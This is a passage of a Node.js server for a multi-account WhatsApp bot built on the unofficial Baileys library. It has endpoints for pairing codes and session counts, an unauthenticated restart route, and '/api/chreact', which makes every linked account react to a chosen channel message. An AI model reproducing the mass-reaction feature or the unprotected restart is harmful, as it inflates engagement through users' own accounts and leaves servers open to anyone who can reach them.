    const number = req.query.number;
    if (!number) {
        return res.json({ error: 'Number parameter is required' });
    }

    // Validate that the 'number' query parameter contains only digits to prevent path traversal
    if (!/^\d+$/.test(number)) {
        return res.json({ error: 'Invalid number format. Only digits are allowed.' });
    }

    if (activeSessions.has(number)) {
        return res.json({ error: 'already_connected', message: 'This number is already connected' });
    }

    if (activeSessions.size >= MAX_SESSIONS) {
        return res.json({
            error: 'Maximum sessions limit reached',
            message: `Maximum ${MAX_SESSIONS} active sessions allowed.`
        });
    }

    if (pendingSessions.has(number)) {
        try { pendingSessions.get(number).ws?.close(); } catch (_) { }
        pendingSessions.delete(number);
    }
    
    // ✅ Initialize/verify default config in database if empty or missing
    const userConfig = await loadConfig(number);

    try {
        const sessionPath = path.join(SESSION_DIR, `session_${number}`);
        fse.ensureDirSync(sessionPath);

        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();
        const logger = pino({ level: 'fatal' });

        const sock = makeWASocket({
            version,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, logger),
            },
            printQRInTerminal: false,
            logger,
            syncFullHistory: false,
            browser: Browsers.windows('Chrome'),
            generateHighQualityLinkPreview: true,
            markOnlineOnConnect: true
        });

        attachBotHandlers(sock, number, userConfig, saveCreds);

        if (!state.creds.registered) {
            pendingSessions.set(number, sock);
            await delay(1500);
            const code = await sock.requestPairingCode(number);
            return res.json({ code });
        }

        return res.json({ message: 'already_connected' });

    } catch (err) {
        pendingSessions.delete(number);
        console.error('Pairing error:', err.message);
        return res.json({
            error: 'Failed to generate pairing code',
            message: 'Please try again or check your number format',
        });
    }
});

app.get('/api/chreact', async (req, res) => { 
    const { newsletter, message, emojis } = req.query;

    // Validation
    if (!newsletter || !message || !emojis) {
        return res.json({
            success: false,
            message: 'newsletterjid, messageid and emojis are required'
        });
    }

    try {
        // Newsletter format fix
        let jid = newsletter;

        if (!jid.endsWith('@newsletter')) {
            jid += '@newsletter';
        }

        // Allowed newsletters check
        const newsletterJids = config.SMD || [];

        if (
            newsletterJids.length > 0 &&
            !newsletterJids.includes(jid)
        ) {
            return res.json({
                success: false,
                newsletterJid: jid,
                messageId: message,
                emojis,
                message: 'Newsletter not in allowed list'
            });
        }

        // Emoji list
        const emojiList = emojis
            .split(',')
            .map(e => e.trim())
            .filter(Boolean);

        if (!emojiList.length) {
            return res.json({
                success: false,
                message: 'Invalid emojis'
            });
        }

        // Sessions
        const sessions = [...activeSessions.values()];

        if (!sessions.length) {
            return res.json({
                success: false,
                message: 'No active sessions'
            });
        }

        let successCount = 0;
        let failedCount = 0;

        for (const sock of sessions) {
            try {
                const emoji = 
                    emojiList[
                        Math.floor(Math.random() * emojiList.length)
                    ];

                await sock.newsletterReactMessage(
                    jid,
                    message,
                    emoji
                );

                successCount++;

            } catch (err) {
                failedCount++;
            }
        }

        return res.json({ 
            success: true,
            newsletterJid: jid,
            messageId: message,
            emojis: emojiList,
            reacted: successCount,
            failed: failedCount,
            total: sessions.length,
            message: `Reacted to ${successCount} bots`
        });

    } catch (err) {
        return res.json({
            success: false,
            newsletterJid: newsletter,
            messageId: message,
            emojis,
            message: 'Failed to react',
            error: err.message
        });
    }
});

app.get('/api/active', (req, res) => {
    res.json({ 
        count: activeSessions.size,
        limit: MAX_SESSIONS,
    });
});

app.get('/api/restart', (req, res) => {
    res.json({ success: true, message: 'Restarting server...' });
    setTimeout(() => {
        process.exit(0);
    }, 1000);
});

// ─────────────────────────────────────
//  STARTUP
// ─────────────────────────────────────

async function main() {
    await connectMongo();
    await loadPluginFiles();

    const savedNumbers = await getActiveNumbers();
    for (const number of savedNumbers) {
        try {
            await startBot(number);
        } catch (err) {
            console.error(`❌ Error starting session for ${number}:`, err.message);
        }
    }

    app.listen(PORT, '0.0.0.0', () => {
        console.log(`🚀 Server running on: http://localhost:${PORT}`);
    }).on('error', (err) => {
        console.error('❌ Failed to start server:', err.message);
    });
}

main().catch(err => console.error('❌ Startup error:', err.message));
